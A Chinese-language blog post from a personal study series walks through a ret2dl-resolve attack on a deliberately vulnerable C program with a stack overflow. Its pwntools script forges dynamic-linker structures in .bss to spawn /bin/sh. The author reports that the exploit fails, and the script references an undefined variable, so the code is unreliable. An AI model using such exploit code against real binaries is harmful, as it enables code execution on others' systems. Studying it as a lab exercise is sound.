<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="exploit without info leak - 2"/>







  <link rel="alternate" href="/atom.xml" title="WeeklyAlgo">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.1.0" />



<link rel="canonical" href="http://weeklyalgo.codes/2017/03/05/exploit without info leak - 2/"/>


<meta name="description" content="不依靠信息泄漏来exploit - 2">
<meta property="og:type" content="article">
<meta property="og:title" content="exploit without info leak - 2">
<meta property="og:url" content="http://weeklyalgo.codes/2017/03/05/exploit without info leak - 2/index.html">
<meta property="og:site_name" content="WeeklyAlgo">
<meta property="og:description" content="不依靠信息泄漏来exploit - 2">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://weeklyalgo.codes/images/exploit%20without%20info%20leak%20-%202/1.jpeg">
<meta property="og:updated_time" content="2017-08-03T16:13:12.688Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="exploit without info leak - 2">
<meta name="twitter:description" content="不依靠信息泄漏来exploit - 2">
<meta name="twitter:image" content="http://weeklyalgo.codes/images/exploit%20without%20info%20leak%20-%202/1.jpeg">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.1.0" />



  <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />




  



    <title> exploit without info leak - 2 · WeeklyAlgo </title>
  </head>

  <body>
    <div class="container">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">WeeklyAlgo</a>
</div>

<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/">
            首页
          </a>
        </li>
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            归档
          </a>
        </li>
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/categories">
            分类
          </a>
        </li>
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/about">
            关于
          </a>
        </li>
      
        
        <li class="menu-item">
          <a class="menu-item-link" href="/flinks">
            友链
          </a>
        </li>
      
      
    </ul>
  
</nav>

<div class="mobile-navbar">
  <div class="mobile-header">
    <div class="mobile-header-logo">
      <a href="/." class="logo">WeeklyAlgo</a>
    </div>

    <div class="mobile-header-icon">
      <span></span>
      <span></span>
      <span></span>
    </div>
  </div>
  <nav class="mobile-menu">
    
      
      <a class="mobile-menu-item" href="/">
        首页
      </a>
    
      
      <a class="mobile-menu-item" href="/archives/">
        归档
      </a>
    
      
      <a class="mobile-menu-item" href="/categories">
        分类
      </a>
    
      
      <a class="mobile-menu-item" href="/about">
        关于
      </a>
    
      
      <a class="mobile-menu-item" href="/flinks">
        友链
      </a>
    
  </nav>
</div>
      </header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content">
            
  
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          exploit without info leak - 2
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2017年3月5日
        </span>
      </div>
    </header>

    
      <div class="post-toc" id="post-toc">
        <h2 class="post-toc-title">文章目录</h2>
        <div class="post-toc-content">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#不依靠信息泄漏来exploit-2"><span class="toc-text">不依靠信息泄漏来exploit - 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息介绍"><span class="toc-text">信息介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击思路"><span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击测试"><span class="toc-text">攻击测试</span></a></li></ol></li></ol>
        </div>
      </div>
    

    <div class="post-content">
      
        <h1 id="不依靠信息泄漏来exploit-2"><a href="#不依靠信息泄漏来exploit-2" class="headerlink" title="不依靠信息泄漏来exploit - 2"></a>不依靠信息泄漏来exploit - 2</h1><a id="more"></a>
<blockquote>
<ul>
<li>by hook</li>
</ul>
</blockquote>
<h2 id="信息介绍"><a href="#信息介绍" class="headerlink" title="信息介绍"></a>信息介绍</h2><p>代码不变，此篇是上篇 &lt;&lt; exploit with out info leak &gt;&gt;的续篇，主要实现上篇中提到的第二种攻击思路。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulfunc</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">char</span> sbuf[<span class="number">10</span>];</div><div class="line">    read(<span class="number">0</span>, sbuf, <span class="number">60</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    vulfunc();</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol>
<li>伪造.dynstr, .dynsym, .rel.plt三个段，填充要重定位的函数信息。</li>
<li>压栈伪造函数的传入参数</li>
<li>压栈伪造.rel.plt起始地址的相对便宜下标</li>
<li>成功得到shell</li>
</ol>
<h2 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h2><p>先贴exp：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line">from time import *</div><div class="line"></div><div class="line">vulFunAddr = 0x080484ab</div><div class="line">mainFunAddr = 0x080484d6</div><div class="line">readpltAddr = 0x08048350</div><div class="line">exitpltAddr = 0x08048390</div><div class="line">putspltAddr = 0x08048370</div><div class="line">printfpltAddr = 0x08048360</div><div class="line">printfgotAddr = 0x0804a010</div><div class="line">rel_pltAddr = 0x080482e0</div><div class="line">dynsymAddr = 0x080481cc</div><div class="line">dynstrAddr = 0x0804824c</div><div class="line">bssAddr = 0x0804a02c</div><div class="line">binShellStr = '/bin/sh\0'</div><div class="line">expOffset = 22 </div><div class="line">payloadHead = 'a'*expOffset</div><div class="line"></div><div class="line">p = process('./fullyRELRO.elf')</div><div class="line">context.log_level = 'debug'</div><div class="line">context.terminal = ['tmux', 'splitw', '-h']</div><div class="line"></div><div class="line">p.recvline()</div><div class="line"></div><div class="line"><span class="comment">#step 1: write '/bin/sh\0' to BSS seg</span></div><div class="line">payload1 = payloadHead + p32(readpltAddr) + p32(vulFunAddr) + p32(0) + p32(bssAddr) + p32(8)</div><div class="line">p.send(payload1)</div><div class="line">p.send(binShellStr)</div><div class="line">log.info(<span class="string">"* [ok]: write '/bin/sh\0' to .bss seg successed!"</span>)</div><div class="line"></div><div class="line"><span class="comment">#step 2: 计算出一个relco，使_dl_runtime_resolve解析能够落入可控区域</span></div><div class="line">fake_elf_relAddr = bssAddr + len(binShellStr) + 4</div><div class="line">relco_index = fake_elf_relAddr - rel_pltAddr</div><div class="line"></div><div class="line"><span class="comment">#计算各个偏移地址和_dl_fixup正确的解析数据格式</span></div><div class="line"><span class="comment">#.dynsym &#123; st_name = .dynsym + 0xd &#125;</span></div><div class="line">fake_dynsymAddr = fake_elf_relAddr + 4*2 + 4</div><div class="line">fake_f_info_index = (((fake_dynsymAddr-dynsymAddr)/0x10) &lt;&lt; 8) | 0x7</div><div class="line"></div><div class="line"></div><div class="line">fake_dynstrAddr = fake_dynsymAddr + 4*2 + 4 </div><div class="line"><span class="comment">#fake_st_name = fake_dynstrAddr - dynstrAddr</span></div><div class="line"><span class="comment">#fake_st_name = (fake_dynsymAddr + 16) - dynstrAddr</span></div><div class="line"></div><div class="line">print <span class="string">"* [ok]: cal -&gt; relco_index=%#x, fake_rel.plt=%#x, rel.plt=%#x"</span> % (relco_index,fake_elf_relAddr, rel_pltAddr)</div><div class="line">print <span class="string">"* [ok]: cal -&gt; f_info=%#x, fake_dynsymAddr=%#x, dynsym=%#x"</span> % (fake_f_info_index,fake_dynsymAddr, dynsymAddr)</div><div class="line">print <span class="string">"* [ok]: cal -&gt; st_name=%#x, fake_dynstrAddr=%#x, dynstr=%#x"</span> % (fake_st_name,fake_dynstrAddr, dynstrAddr)</div><div class="line"></div><div class="line"><span class="comment">#step3: 将伪造的各个段数据写入可控区域</span></div><div class="line">payload_writeInfoHeader = payloadHead + p32(readpltAddr) + p32(vulFunAddr) + p32(0)</div><div class="line"></div><div class="line">payload2 = payload_writeInfoHeader + p32(fake_elf_relAddr) + p32(4)</div><div class="line">payload22 = payload_writeInfoHeader + p32(fake_elf_relAddr+4) + p32(4)</div><div class="line">p.send(payload2)</div><div class="line">p.send(p32(fake_dynstrAddr + 24))</div><div class="line">p.send(payload22)</div><div class="line">p.send(p32(fake_f_info_index))</div><div class="line">log.info(<span class="string">"* [ok]: write fake .rel.plt to bss seg"</span>)</div><div class="line"></div><div class="line">payload3 = payload_writeInfoHeader + p32(fake_dynsymAddr) + p32(4)</div><div class="line">payload32 = payload_writeInfoHeader + p32(fake_dynsymAddr+4) + p32(4)</div><div class="line">p.send(payload3)</div><div class="line">p.send(p32(fake_st_name))</div><div class="line">p.send(payload32)</div><div class="line">p.send(p32(0))</div><div class="line">log.info(<span class="string">"* [ok]: write fake .dynsym to bss seg"</span>)</div><div class="line"></div><div class="line">str = 'execv' + chr(0)</div><div class="line">payload4 = payload_writeInfoHeader + p32(fake_dynstrAddr) + p32(len(str)+1)</div><div class="line">p.send(payload4)</div><div class="line">p.send(str)</div><div class="line">log.info(<span class="string">"* [ok]: write fake .dynstr to bss seg"</span>)</div><div class="line"></div><div class="line"><span class="comment">#step4: 压栈relco_index, 调用plt0</span></div><div class="line">plt0 = 0x08048340</div><div class="line">payload5 = payloadHead + p32(plt0) + p32(relco_index) + p32(vulFunAddr) + p32(bssAddr)</div><div class="line"><span class="comment">#gdb.attach(p, execute="b _dl_fixup\nb _dl_lookup_symbol_x\n")</span></div><div class="line">p.send(payload5)</div><div class="line">log.info(<span class="string">"* [ok]: call _dl_runtime_resolve, get ‘execv' Address over write 'printf' got"</span>)</div><div class="line">str = p.recv()</div><div class="line">print str</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>在测试结果时，重定位提示<code>symbol lookup error</code> &amp; <code>undefined symbol</code>，调试了好久也没找到是哪个地方的地址计算错了，不过错误也说明<code>_dl_fixup</code>也顺着我伪造的数据解析下去了。<br><img src="/images/exploit without info leak - 2/1.jpeg" alt=""><br>由于最近事实在是太多了，所以这篇文章写后就不再调试找问题了，准备把重心放在其他类型的漏洞学习上。</p>

      
    </div>

    
  </article>


          </div>
          
  <div class="comments" id="comments">
    
      <div class="ds-thread" data-thread-key="2017/03/05/exploit without info leak - 2/"
           data-title="exploit without info leak - 2" data-url="http://weeklyalgo.codes/2017/03/05/exploit without info leak - 2/">
      </div>
    
  </div>

        </div>  
      </main>

      <footer id="footer" class="footer">
  <div class="social-links">
    
      
    
      
    
      
    
      
    
      
        
          <a href="https://github.com/weeklyalgo4groups" class="iconfont icon-github" title="github"></a>
        
      
    
      
    
      
    
    
    
  </div>


<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
  </span>
  
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">
    
    &copy; 
    
    2017

    <span class="author">weeklyalgo.codes</span>
  </span>
</div>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>

    
  

  <script type="text/javascript">
    var duoshuoQuery = {short_name:"weeklyalgo"};
    (function() {
      var ds = document.createElement('script');
      ds.type = 'text/javascript';ds.async = true;
      ds.id = 'duoshuo-script';
      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
      ds.charset = 'UTF-8';
      (document.getElementsByTagName('head')[0]
      || document.getElementsByTagName('body')[0]).appendChild(ds);
    })();
  </script>



    
  





  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  
    <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  

    <script type="text/javascript" src="/js/src/even.js?v=2.1.0"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=2.1.0"></script>

  </body>
</html>